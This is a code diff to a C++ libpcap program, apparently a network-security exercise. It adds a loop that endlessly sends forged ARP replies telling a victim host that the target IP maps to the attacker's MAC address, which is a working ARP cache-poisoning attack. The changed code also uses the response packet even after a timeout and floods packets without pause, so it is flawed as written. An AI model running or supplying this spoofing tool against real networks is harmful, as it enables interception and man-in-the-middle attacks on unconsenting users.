@@ -125,7 +125,7 @@ int main(int argc, char* argv[]) {
 	reqpacket.arp_.smac_ = Mac(macaddr); // source mac (self)
 	reqpacket.arp_.sip_ = htonl(Ip(ipaddr)); // source ip (self)
 	reqpacket.arp_.tmac_ = Mac("00:00:00:00:00:00"); // target mac (00:)
-	reqpacket.arp_.tip_ = htonl(Ip(argv[3])); // victim ip
+	reqpacket.arp_.tip_ = htonl(Ip(argv[2])); // victim ip
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&reqpacket), sizeof(EthArpPacket));
 	if (res != 0) {
@@ -133,7 +133,7 @@ int main(int argc, char* argv[]) {
 	}
 	
 	
-	// ARP response packet
+	// ARP response packet from victim
 	struct pcap_pkthdr* header;
 	const u_char* packet;
 	EthArpPacket* respacket;
@@ -143,17 +143,40 @@ int main(int argc, char* argv[]) {
 	if (ret == 1) { // 패킷을 정상적으로 수신한 경우
 		respacket = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
 		// 수신한 ARP 응답 패킷에서 필요한 정보를 추출하여 사용
-	} else if (ret == 0) { // 타임아웃이 발생한 경우
-		printf("Timeout occurred.\n");
-	} else if (ret == -1) { // 수신 오류가 발생한 경우
-		fprintf(stderr, "Error occurred while receiving packet: %s\n", pcap_geterr(handle));
-	} else if (ret == -2) { // 파일의 끝에 도달한 경우 (더 이상 패킷을 읽을 수 없음)
-		printf("No more packets from the capture file.\n");
+	} else { // 타임아웃이 발생한 경우
+		puts("Timeout occurred.");
 	}
 	
-	printf("%s\n", respacket->eth_.dmac_);
-	printf("%s\n", respacket->eth_.smac_);
+	// printf("%s\n", respacket->eth_.dmac_.ToString().c_str());
+	// printf("%s\n", respacket->eth_.smac_.ToString().c_str());
+	
+	// arp spoof to victim
+	while(1) {
+		EthArpPacket atkpacket;
+
+		atkpacket.eth_.dmac_ = respacket->eth_.dmac_;
+		atkpacket.eth_.smac_ = Mac(macaddr);
+		atkpacket.eth_.type_ = htons(EthHdr::Arp);
+
+		atkpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
+		atkpacket.arp_.pro_ = htons(EthHdr::Ip4);
+		atkpacket.arp_.hln_ = Mac::SIZE;
+		atkpacket.arp_.pln_ = Ip::SIZE;
+		atkpacket.arp_.op_ = htons(ArpHdr::Reply);
+		atkpacket.arp_.smac_ = Mac(macaddr); // source mac (self)
+		atkpacket.arp_.sip_ = htonl(Ip(argv[3])); // source ip (target IP)
+		atkpacket.arp_.tmac_ = respacket->eth_.smac_;
+		atkpacket.arp_.tip_ = htonl(Ip(argv[2])); // victim ip
+
+		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&atkpacket), sizeof(EthArpPacket));
+		if (res != 0) {
+			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		}
+		
+	}
 	
 
 	pcap_close(handle);
 }
+
+
